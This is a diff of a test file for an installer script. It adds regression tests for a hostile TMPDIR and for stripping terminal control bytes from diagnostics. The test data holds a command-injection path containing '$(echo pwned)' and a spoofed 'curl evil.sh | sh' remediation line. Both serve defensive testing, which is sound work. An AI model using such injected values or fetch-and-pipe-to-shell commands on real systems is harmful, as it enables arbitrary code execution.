@@ -571,34 +571,67 @@ linuxGuardedTest(
 // These two drive the real script. They are the tests the purity guard's own
 // argument demands: a diff is checked once, a test is checked forever.
 
-linuxGuardedTest(
-  "AC12: a hostile TMPDIR cannot turn the containment report into a gate",
-  async () => {
-    // Two failure modes at once, both of which aborted the installer AFTER it
-    // had printed "keryx installed":
-    //   * an apostrophe in the path made the RETURN trap body a syntax error,
-    //     and a failing RETURN trap is fatal under `set -e`;
-    //   * an unwritable TMPDIR made `mktemp` fail.
-    // The report must survive both and still exit 0.
-    const hostileTmp = join(workspace, "tmp-with-'quote");
-    await mkdir(hostileTmp, { recursive: true });
-
-    const filteredPath = await pathWithoutBwrap();
-    const install = await run(["bash", INSTALL_SH, "--global"], {
-      env: installEnv({
-        PATH: filteredPath,
-        TMPDIR: hostileTmp,
-        KERYX_BIN_DIR: join(workspace, "bin-hostile-tmp"),
-      }),
-    });
-    expectInstallSucceeded("hostile TMPDIR", install);
-    expect(install.stdout).toMatch(/OS sandbox containment:/i);
-    // The report ran rather than being cut short by an aborting trap.
-    expect(install.stdout).toMatch(/containment probe: not run|containment probe: (OK|FAILED)/i);
-    expect(install.stderr).not.toMatch(/unexpected EOF|syntax error/i);
+// Each of the three regressions has its own case, because each had its own
+// mechanism and a single "weird TMPDIR" test would have covered only the last
+// one. (It did: the first version of this block asserted an apostrophe and
+// claimed to cover unwritability too, which review caught.)
+const HOSTILE_TMPDIRS: { label: string; regression: string; make: () => Promise<string> }[] = [
+  {
+    label: "apostrophe in the path",
+    regression: "round 3 — eager trap expansion made the trap body a syntax error, fatal under set -e",
+    make: async () => {
+      // Also exercises the injection shape: before the deferred-expansion fix,
+      // a `$(...)` inside TMPDIR was executed by the installer's own shell.
+      const dir = join(workspace, "tmp-with-'quote-$(echo pwned)");
+      await mkdir(dir, { recursive: true });
+      return dir;
+    },
   },
-  INSTALL_TIMEOUT_MS,
-);
+  {
+    label: "unwritable directory",
+    regression: "round 2 — mktemp failing under set -e aborted the installer",
+    make: async () => {
+      const dir = join(workspace, "tmp-unwritable");
+      await mkdir(dir, { recursive: true });
+      await chmod(dir, 0o500);
+      return dir;
+    },
+  },
+  {
+    label: "path that does not exist",
+    regression: "round 2 — same mktemp failure, reached a different way",
+    make: async () => join(workspace, "tmp-does-not-exist", "nope"),
+  },
+];
+
+for (const { label, regression, make } of HOSTILE_TMPDIRS) {
+  linuxGuardedTest(
+    `AC12: a hostile TMPDIR (${label}) cannot turn the containment report into a gate`,
+    async () => {
+      // Every one of these aborted the installer AFTER it had printed "keryx
+      // installed globally" — the report becoming a gate, which is the one
+      // thing this function must never do. Regression: ${regression}
+      const tmp = await make();
+      const filteredPath = await pathWithoutBwrap();
+      const install = await run(["bash", INSTALL_SH, "--global"], {
+        env: installEnv({
+          PATH: filteredPath,
+          TMPDIR: tmp,
+          KERYX_BIN_DIR: join(workspace, `bin-tmp-${label.replace(/\W+/g, "-")}`),
+        }),
+      });
+
+      expectInstallSucceeded(`hostile TMPDIR (${label})`, install);
+      expect(install.stdout).toMatch(/OS sandbox containment:/i);
+      // The report actually ran, rather than being cut short by an abort.
+      expect(install.stdout).toMatch(/containment probe: (not run|OK|FAILED)/i);
+      expect(install.stderr).not.toMatch(/unexpected EOF|syntax error|unbound variable/i);
+      // Nothing in the path was executed as a command.
+      expect(install.stdout).not.toContain("pwned");
+    },
+    INSTALL_TIMEOUT_MS,
+  );
+}
 
 linuxGuardedTest(
   "AC12: a failing keryx cannot drive the installer's terminal or flood its log",
@@ -618,7 +651,7 @@ linuxGuardedTest(
         'for arg in "$@"; do',
         '  if [ "$arg" = "sandbox" ]; then',
         // CR + ESC + BEL + backspace, then a flood of long lines.
-        `    printf 'clean-marker\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\n' >&2`,
+        `    printf 'clean-marker: a;b[c]d<e>f=g?h@i&j\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\302\\205\\302\\233\\n' >&2`,
         "    i=0",
         "    while [ $i -lt 120 ]; do",
         `      awk 'BEGIN{s="";for(i=0;i<900;i++)s=s "y";print "flood" s}' >&2`,
@@ -647,9 +680,22 @@ linuxGuardedTest(
     // … stripped of everything that could move the cursor. Asserted on the
     // BYTES, because the whole point is what is in the stream, not what it
     // renders as.
+    // C0 and DEL — every control that can actually erase the indent.
     for (const control of ["\r", "\u001B", "\u0007", "\u0008", "\u007F"]) {
       expect(install.stdout.includes(control)).toBe(false);
     }
+
+    // …and the other direction, which matters just as much: the strip must
+    // not eat the operator's evidence. An attempt to also remove the C1 range
+    // did exactly that — bash bracket RANGES use locale collation, not code
+    // points, and install.sh runs in the C locale, where that range deleted
+    // ": ; [ ] < > = ? @ &" from the diagnostic. Caught by this line.
+    expect(install.stdout).toContain("clean-marker: a;b[c]d<e>f=g?h@i&j");
+
+    // C1 is deliberately left alone (see install.sh); a UTF-8 terminal
+    // renders it as a character rather than acting on it. Asserted so the
+    // decision is visible rather than looking like an oversight.
+    expect(install.stdout.includes("\u0085")).toBe(true);
     // … and bounded, in both directions.
     expect(install.stdout).toContain("(line truncated)");
     expect(install.stdout).toContain("(output truncated)");
